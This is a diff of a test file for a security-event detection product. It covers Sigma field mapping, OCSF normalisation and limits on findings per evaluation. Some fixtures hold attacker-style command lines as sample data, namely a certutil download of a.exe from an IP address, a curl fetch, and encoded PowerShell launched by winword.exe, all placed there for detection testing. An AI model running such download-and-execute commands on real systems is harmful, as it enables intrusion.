@@ -82,6 +82,7 @@ import {
   DETECTION_MATCH_COUNT_ATTRIBUTE,
   DETECTION_MATCH_COUNT_THRESHOLD_MAX,
   DETECTION_MATCH_COUNT_THRESHOLD_MIN,
+  DETECTION_MAX_FINDINGS_PER_EVALUATION,
   DETECTION_MAX_GROUPS_PER_EVALUATION,
   DETECTION_MAX_LOOKBACK_IN_MINUTES,
   DETECTION_RULE_ID_ATTRIBUTE,
@@ -120,6 +121,7 @@ import {
   THREAT_INTEL_DEFAULT_VALID_DAYS,
   THREAT_INTEL_FIRST_MATCH_WINDOW_IN_MINUTES,
   THREAT_INTEL_MATCH_MAX_LOOKBACK_IN_MINUTES,
+  THREAT_INTEL_MAX_FINDINGS_PER_EVALUATION,
   THREAT_INTEL_MAX_INDICATORS_PER_EVALUATION,
   THREAT_INTEL_MINIMUM_CONFIDENCE_MAX,
   THREAT_INTEL_MINIMUM_CONFIDENCE_MIN,
@@ -132,6 +134,7 @@ import {
 } from "Common/Types/SecurityEvent/ThreatIntelConstants";
 import TimeRange from "Common/Types/Time/TimeRange";
 import GenericNormalizer from "Common/Utils/SecurityEvent/GenericNormalizer";
+import OcsfNormalizer from "Common/Utils/SecurityEvent/OcsfNormalizer";
 import SecurityEventNormalizer from "Common/Utils/SecurityEvent/SecurityEventNormalizer";
 import SigmaRuleParser from "Common/Utils/SecurityEvent/Sigma/SigmaRuleParser";
 import StixPatternParser, {
@@ -771,6 +774,12 @@ describe("the Security Events page", () => {
       className: "TYPE_FIELDS",
       ruleName: "RULE_NAME_FIELDS",
       productName: "PRODUCT_FIELDS",
+      processName: "PROCESS_NAME_FIELDS",
+      processPath: "PROCESS_PATH_FIELDS",
+      processCommandLine: "COMMAND_LINE_FIELDS",
+      parentProcessName: "PARENT_PROCESS_NAME_FIELDS",
+      parentProcessPath: "PARENT_PROCESS_PATH_FIELDS",
+      parentProcessCommandLine: "PARENT_COMMAND_LINE_FIELDS",
     };
 
     expect(
@@ -806,6 +815,15 @@ describe("the Security Events page", () => {
       className: ["ssh_login", "file_access"],
       ruleName: ["rule one", "rule two"],
       productName: ["Falco", "auditd"],
+      processName: ["powershell.exe", "cmd.exe"],
+      processPath: ["C:\\Windows\\System32\\certutil.exe", "/usr/bin/curl"],
+      processCommandLine: [
+        "certutil -urlcache -f http://203.0.113.7/a.exe",
+        "curl -s https://get.example/x",
+      ],
+      parentProcessName: ["winword.exe", "bash"],
+      parentProcessPath: ["C:\\Windows\\explorer.exe", "/usr/bin/bash"],
+      parentProcessCommandLine: ["explorer.exe", "bash -c x"],
     };
 
     function read(field: string, event: NormalizedSecurityEvent): string {
@@ -1400,7 +1418,7 @@ describe("the Security Events page", () => {
     });
     expect(resolveSigmaField("CommandLine")).toEqual({
       kind: "textColumn",
-      column: "principalProcess",
+      column: "processCommandLine",
     });
     expect(resolveSigmaField("src_ip")).toEqual({
       kind: "textColumn",
@@ -1419,6 +1437,59 @@ describe("the Security Events page", () => {
     );
     expect(page).toContain(
       "An attribute is named as it is in the event (`threat.matched`, not `attributes.threat.matched`).",
+    );
+  });
+
+  it("reads Image, CommandLine, ParentImage and ParentCommandLine as the process an event is about and its parent, never as principalProcess", () => {
+    const line: string = lineStarting(
+      page,
+      "What a rule can say",
+      "- `Image` and `CommandLine`",
+    );
+    const named: Array<string> = codeSpans(line);
+
+    expect(named).toEqual([
+      "Image",
+      "CommandLine",
+      "processPath",
+      "processCommandLine",
+      "ParentImage",
+      "ParentCommandLine",
+      "parentProcessPath",
+      "parentProcessCommandLine",
+      "principalProcess",
+    ]);
+
+    // Each Sigma name reads the column the page pairs it with.
+    for (const [field, column] of [
+      ["Image", "processPath"],
+      ["CommandLine", "processCommandLine"],
+      ["ParentImage", "parentProcessPath"],
+      ["ParentCommandLine", "parentProcessCommandLine"],
+    ]) {
+      expect({ field, resolved: resolveSigmaField(field as string) }).toEqual({
+        field,
+        resolved: { kind: "textColumn", column },
+      });
+    }
+
+    // In a launch the actor is the parent: OCSF's actor.process.
+    const launch: NormalizedSecurityEvent = OcsfNormalizer.normalize({
+      class_uid: 1007,
+      activity_id: 1,
+      actor: { process: { name: "winword.exe", cmd_line: "winword.exe" } },
+      process: {
+        name: "powershell.exe",
+        cmd_line: "powershell.exe -enc JAB",
+        file: { path: "C:\\Windows\\powershell.exe" },
+      },
+    });
+
+    expect(launch.principalProcess).toBe("winword.exe");
+    expect(launch.parentProcessName).toBe("winword.exe");
+    expect(launch.processCommandLine).toBe("powershell.exe -enc JAB");
+    expect(page).toContain(
+      "`principalProcess` is the process that acted, which in a launch is the parent.",
     );
   });
 
@@ -1529,18 +1600,26 @@ describe("the Security Events page", () => {
     );
   });
 
-  it("runs the rules every minute over back-to-back windows, at most 24 hours back, firing at most the 100 highest groups", () => {
+  it("runs the rules every minute over back-to-back windows, at most 24 hours back, recording every group and opening cases for the 100 highest", () => {
     const job: string = source("detectionJob");
     const evaluator: string = flat(source("detectionEvaluator"));
     const service: string = flat(source("securityEventService"));
 
     expect(job).toContain("schedule: EVERY_MINUTE,");
-    expect(job).toContain("DetectionRuleEvaluator.evaluateAllDueRules()");
+    expect(job).toContain(
+      "DetectionRuleEvaluator.enqueueProjectsWithDueRules()",
+    );
+    expect(job).toContain(
+      "DetectionRuleEvaluator.evaluateDueRulesForProject(projectId, lease)",
+    );
     expect(evaluator).toContain(
       "let startTime: Date = rule.lastEvaluatedAt ? rule.lastEvaluatedAt : OneUptimeDate.addRemoveMinutes(endTime, -intervalInMinutes); if (OneUptimeDate.isBefore(startTime, earliestAllowed)) { startTime = earliestAllowed; }",
     );
     expect(evaluator).toContain(
-      "maxGroups: DETECTION_MAX_GROUPS_PER_EVALUATION,",
+      "maxGroups: DETECTION_MAX_FINDINGS_PER_EVALUATION + 1,",
+    );
+    expect(evaluator).toContain(
+      "openLimit: DETECTION_MAX_GROUPS_PER_EVALUATION, recordLimit: DETECTION_MAX_FINDINGS_PER_EVALUATION,",
     );
     expect(service).toContain(
       "AND time >= ${{ type: TableColumnType.DateTime64, value: data.startTime, }} AND time < ${{ type: TableColumnType.DateTime64, value: data.endTime, }}",
@@ -1550,6 +1629,7 @@ describe("the Security Events page", () => {
     );
     expect(DETECTION_MAX_LOOKBACK_IN_MINUTES).toBe(24 * 60);
     expect(DETECTION_MAX_GROUPS_PER_EVALUATION).toBe(100);
+    expect(DETECTION_MAX_FINDINGS_PER_EVALUATION).toBe(10000);
     expect(page).toContain(
       "OneUptime checks every minute for enabled rules whose interval has passed since their last run.",
     );
@@ -1566,7 +1646,7 @@ describe("the Security Events page", () => {
       "the next run covers the whole gap, up to the last 24 hours.",
     );
     expect(page).toContain(
-      "- At most 100 groups fire per run: the ones with the highest counts.",
+      "- Every group that reaches the threshold becomes a Detection Finding, up to 10,000 a run. Alerts, incidents and cases open for the 100 with the highest counts; the rest share one case about the rule, and the rule's **Last Error** says how many groups matched.",
     );
   });
 
@@ -2157,7 +2237,7 @@ describe("the Threat Intelligence page", () => {
     expect(statement.query).toContain(">=");
   });
 
-  it("matches every minute: 15 minutes first, at most 24 hours back, at most the 100 values seen in the most events", () => {
+  it("matches every minute: 15 minutes first, at most 24 hours back, recording every value and opening cases for the 100 seen in the most events", () => {
     const matcher: string = flat(source("matcher"));
     const indicators: string = flat(source("indicatorService"));
 
@@ -2166,6 +2246,13 @@ describe("the Threat Intelligence page", () => {
     expect(THREAT_INTEL_FIRST_MATCH_WINDOW_IN_MINUTES).toBe(15);
     expect(THREAT_INTEL_MATCH_MAX_LOOKBACK_IN_MINUTES).toBe(24 * 60);
     expect(THREAT_INTEL_MAX_INDICATORS_PER_EVALUATION).toBe(100);
+    expect(THREAT_INTEL_MAX_FINDINGS_PER_EVALUATION).toBe(10000);
+    expect(matcher).toContain(
+      "maxGroups: THREAT_INTEL_MAX_FINDINGS_PER_EVALUATION + 1,",
+    );
+    expect(matcher).toContain(
+      "openLimit: MAX_GROUPS_PER_EVALUATION, recordLimit: THREAT_INTEL_MAX_FINDINGS_PER_EVALUATION,",
+    );
     expect(matcher).toContain(
       "let startTime: Date = feed.lastEvaluatedAt ? feed.lastEvaluatedAt : OneUptimeDate.addRemoveMinutes( endTime, -THREAT_INTEL_FIRST_MATCH_WINDOW_IN_MINUTES, ); if (OneUptimeDate.isBefore(startTime, earliestAllowed)) { startTime = earliestAllowed; }",
     );
@@ -2179,7 +2266,7 @@ describe("the Threat Intelligence page", () => {
       "- The first check covers the last 15 minutes. After an outage, the next check catches up on at most the last 24 hours.",
     );
     expect(page).toContain(
-      "- Each check matches at most 100 indicator values per feed: the ones seen in the most events.",
+      "- Each check records every matched indicator value as a finding, up to 10,000 per feed. Alerts, incidents and cases open for the 100 values seen in the most events; the rest share one case about the feed, and the feed's **Last Match Error** says how many matched.",
     );
     expect(page).toContain(
       "Matching compares an indicator's value with an event's observables, not with every field",
